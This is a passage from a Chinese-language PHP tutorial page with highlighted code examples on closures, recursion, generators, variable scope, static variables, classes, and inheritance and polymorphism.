class="variable">$greet</span>(<span class="string">&quot;Dave&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 闭包（访问外部变量）</span></span><br><span class="line"><span class="variable">$prefix</span> = <span class="string">&quot;Welcome&quot;</span>;</span><br><span class="line"><span class="variable">$greetWithPrefix</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;<span class="subst">$prefix</span>, <span class="subst">$name</span>!&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$greetWithPrefix</span>(<span class="string">&quot;Eve&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="7-2-函数高级特性"><a href="#7-2-函数高级特性" class="headerlink" title="7.2 函数高级特性"></a>7.2 函数高级特性</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 递归函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$n</span> * <span class="title function_ invoke__">factorial</span>(<span class="variable">$n</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Factorial of 5: &quot;</span> . <span class="title function_ invoke__">factorial</span>(<span class="number">5</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成器（PHP 5.5+）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rangeGenerator</span>(<span class="params"><span class="variable">$start</span>, <span class="variable">$end</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="variable">$start</span>; <span class="variable">$i</span> &lt;= <span class="variable">$end</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">yield</span> <span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">rangeGenerator</span>(<span class="number">1</span>, <span class="number">5</span>) <span class="keyword">as</span> <span class="variable">$number</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Number: <span class="subst">$number</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过引用传递参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">increment</span>(<span class="params">&amp;<span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$value</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$counter</span> = <span class="number">10</span>;</span><br><span class="line"><span class="title function_ invoke__">increment</span>(<span class="variable">$counter</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Counter after increment: <span class="subst">$counter</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数作为参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">apply</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">callable</span> <span class="variable">$callback</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$callback</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$squared</span> = <span class="title function_ invoke__">apply</span>(<span class="number">5</span>, function(<span class="variable">$n</span>) &#123; <span class="keyword">return</span> <span class="variable">$n</span> * <span class="variable">$n</span>; &#125;);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5 squared: <span class="subst">$squared</span>\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="8-PHP-变量作用域"><a href="#8-PHP-变量作用域" class="headerlink" title="8. PHP 变量作用域"></a>8. PHP 变量作用域</h2><h3 id="详细解释-7"><a href="#详细解释-7" class="headerlink" title="详细解释"></a>详细解释</h3><p>变量作用域决定了变量在哪些部分可以被访问。</p>
<h3 id="主要作用域："><a href="#主要作用域：" class="headerlink" title="主要作用域："></a>主要作用域：</h3><ul>
<li><strong>局部作用域</strong>：在函数内部声明的变量</li>
<li><strong>全局作用域</strong>：在函数外部声明的变量</li>
<li><strong>静态作用域</strong>：使用<code>static</code>关键字声明的变量</li>
</ul>
<h3 id="变量作用域特点："><a href="#变量作用域特点：" class="headerlink" title="变量作用域特点："></a>变量作用域特点：</h3><ul>
<li>局部变量在函数执行完毕后销毁</li>
<li>全局变量在脚本执行期间一直存在</li>
<li>静态变量在函数执行完毕后保留其值</li>
</ul>
<h3 id="8-1-局部变量与全局变量"><a href="#8-1-局部变量与全局变量" class="headerlink" title="8.1 局部变量与全局变量"></a>8.1 局部变量与全局变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局变量</span></span><br><span class="line"><span class="variable">$globalVar</span> = <span class="string">&quot;I&#x27;m global&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testScope</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 局部变量</span></span><br><span class="line">    <span class="variable">$localVar</span> = <span class="string">&quot;I&#x27;m local&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 访问全局变量</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$globalVar</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Global variable: <span class="subst">$globalVar</span>\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 修改全局变量</span></span><br><span class="line">    <span class="variable">$globalVar</span> = <span class="string">&quot;Modified global&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 尝试访问外部变量（会报错）</span></span><br><span class="line">    <span class="comment">// echo $externalVar;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="title function_ invoke__">testScope</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查全局变量是否被修改</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Global variable after function: <span class="subst">$globalVar</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试访问局部变量（会报错）</span></span><br><span class="line"><span class="comment">// echo $localVar;</span></span><br></pre></td></tr></table></figure>

<h3 id="8-2-使用-GLOBAL数组"><a href="#8-2-使用-GLOBAL数组" class="headerlink" title="8.2 使用$GLOBAL数组"></a>8.2 使用$GLOBAL数组</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$globalVar</span> = <span class="string">&quot;Original global value&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testGlobalArray</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 使用$GLOBAL数组访问全局变量</span></span><br><span class="line">    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;globalVar&#x27;</span>] = <span class="string">&quot;Modified global value&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line"><span class="title function_ invoke__">testGlobalArray</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查全局变量是否被修改</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Global variable: &quot;</span> . <span class="variable">$globalVar</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="8-3-静态变量"><a href="#8-3-静态变量" class="headerlink" title="8.3 静态变量"></a>8.3 静态变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 静态变量，函数执行后保留其值</span></span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$count</span>++;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Counter 1: &quot;</span> . <span class="title function_ invoke__">counter</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Counter 2: &quot;</span> . <span class="title function_ invoke__">counter</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Counter 3: &quot;</span> . <span class="title function_ invoke__">counter</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态变量在函数外部不可访问</span></span><br><span class="line"><span class="comment">// echo $count; // 会报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 静态变量示例：缓存计算结果</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$cache</span> = [];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$cache</span>[<span class="variable">$n</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cache</span>[<span class="variable">$n</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$n</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">fibonacci</span>(<span class="variable">$n</span> - <span class="number">1</span>) + <span class="title function_ invoke__">fibonacci</span>(<span class="variable">$n</span> - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$cache</span>[<span class="variable">$n</span>] = <span class="variable">$result</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fibonacci(10): &quot;</span> . <span class="title function_ invoke__">fibonacci</span>(<span class="number">10</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 55</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Fibonacci(20): &quot;</span> . <span class="title function_ invoke__">fibonacci</span>(<span class="number">20</span>) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 6765</span></span><br></pre></td></tr></table></figure>

<h2 id="9-类与对象"><a href="#9-类与对象" class="headerlink" title="9. 类与对象"></a>9. 类与对象</h2><h3 id="详细解释-8"><a href="#详细解释-8" class="headerlink" title="详细解释"></a>详细解释</h3><p>PHP支持面向对象编程（OOP），允许开发者创建类和对象。</p>
<h3 id="核心概念："><a href="#核心概念：" class="headerlink" title="核心概念："></a>核心概念：</h3><ul>
<li><strong>类</strong>：对象的蓝图或模板</li>
<li><strong>对象</strong>：类的实例</li>
<li><strong>属性</strong>：类的变量</li>
<li><strong>方法</strong>：类的函数</li>
<li><strong>构造函数</strong>：对象创建时自动调用的方法</li>
<li><strong>析构函数</strong>：对象销毁时自动调用的方法</li>
<li><strong>继承</strong>：子类继承父类的属性和方法</li>
<li><strong>多态</strong>：同一方法在不同对象中有不同实现</li>
<li><strong>静态成员</strong>：属于类而非对象的成员</li>
<li><strong>静态方法</strong>：可以直接通过类名调用的方法</li>
</ul>
<h3 id="访问控制："><a href="#访问控制：" class="headerlink" title="访问控制："></a>访问控制：</h3><ul>
<li><code>public</code>：任何地方都可以访问</li>
<li><code>protected</code>：类内部和子类可以访问</li>
<li><code>private</code>：仅类内部可以访问</li>
<li><code>static</code>：静态成员或方法，可直接通过类名访问</li>
</ul>
<h3 id="9-1-基本类与对象"><a href="#9-1-基本类与对象" class="headerlink" title="9.1 基本类与对象"></a>9.1 基本类与对象</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">        <span class="comment">// 每创建一个对象，静态计数器增加</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$count</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">greet</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, my name is &quot;</span> . <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot; and I am &quot;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot; years old.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">createDefault</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Anonymous&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法访问静态成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getCount</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Total persons created: &quot;</span> . <span class="built_in">self</span>::<span class="variable">$count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建对象</span></span><br><span class="line"><span class="variable">$person1</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">greet</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问静态成员</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Person</span>::<span class="variable">$count</span> . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法</span></span><br><span class="line"><span class="variable">$person2</span> = <span class="title class_">Person</span>::<span class="title function_ invoke__">createDefault</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person2</span>-&gt;<span class="title function_ invoke__">greet</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用静态方法</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title class_">Person</span>::<span class="title function_ invoke__">getCount</span>() . <span class="string">&quot;\n&quot;</span>; <span class="comment">// Total persons created: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Name: &quot;</span> . <span class="variable">$person1</span>-&gt;name . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查对象类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Is Person: &quot;</span> . (<span class="title function_ invoke__">is_a</span>(<span class="variable">$person1</span>, <span class="string">&#x27;Person&#x27;</span>) ? <span class="string">&quot;Yes&quot;</span> : <span class="string">&quot;No&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-继承与多态"><a href="#9-2-继承与多态" class="headerlink" title="9.2 继承与多态"></a>9.2 继承与多态</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$species</span>;</span><br><span class="line">    <span class="comment">// 静态成员变量</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="built_in">static</span> <span class="variable">$animalCount</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">string</span> <span class="variable">$species</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;species = <span class="variable">$species</span>;</span><br><span class="line">        <span class="comment">// 每创建一个动物，静态计数器增加</span></span><br><span class="line">        <span class="built_in">self</span>::<span class="variable">$animalCount</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getName</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getSpecies</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;species;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态方法：获取动物总数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getAnimalCount</span>(<span class="params"></span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$animalCount</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 抽象方法</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeSound</span>(<span class="params"></span>): <span class="title">string</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 多态核心：不同动物移动方式不同</span></span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>): <span class="title">string</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 公共行为（所有动物共享）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">introduce</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m <span class="subst">&#123;$this-&gt;name&#125;</span>, a <span class="subst">&#123;$this-&gt;species&#125;</span>.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$name</span>, <span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实现抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeSound</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Woof! Woof!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 实现抽象方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;runs on four legs&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 子类特有行为</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$item</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$this-&gt;name&#125;</span> is fetching the <span class="subst">&#123;$item&#125;</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$name</span>, <span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeSound</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Meow! Meow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;sneaks silently&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scratch</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$surface</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$this-&gt;name&#125;</span> is scratching the <span class="subst">&#123;$surface&#125;</span>!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bird</span> <span class="keyword">extends</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$name</span>, <span class="string">&quot;Bird&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeSound</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Chirp! Chirp!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flies through the air&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">layEggs</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$count</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$this-&gt;name&#125;</span> laid <span class="subst">&#123;$count&#125;</span> eggs.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多态函数：接受任何Animal子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">observeAnimal</span>(<span class="params">Animal <span class="variable">$animal</span></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">introduce</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  - Sound: &quot;</span> . <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">makeSound</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  - Movement: &quot;</span> . <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">move</span>() . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 类型检测：安全调用子类特有方法</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$animal</span> <span class="keyword">instanceof</span> Dog) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;  - Special: &quot;</span> . <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;ball&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$animal</span> <span class="keyword">instanceof</span> Cat) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;  - Special: &quot;</span> . <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">scratch</span>(<span class="string">&quot;couch&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$animal</span> <span class="keyword">instanceof</span> Bird) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;  - Special: &quot;</span> . <span class="variable">$animal</span>-&gt;<span class="title function_ invoke__">layEggs</span>(<span class="number">3</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;------------------------\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建不同动物</span></span><br><span class="line"><span class="variable">$animals</span> = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;Buddy&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;Whiskers&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Bird</span>(<span class="string">&quot;Tweety&quot;</span>)</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 统一处理所有动物</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$animals</span> <span class="keyword">as</span> <span class="variable">$animal</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">observeAnimal</span>(<span class="variable">$animal</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用静态方法获取动物总数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Total animals created: &quot;</span> . <span class="title class_">Animal</span>::<span class="title function_ invoke__">getAnimalCount</span>() . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

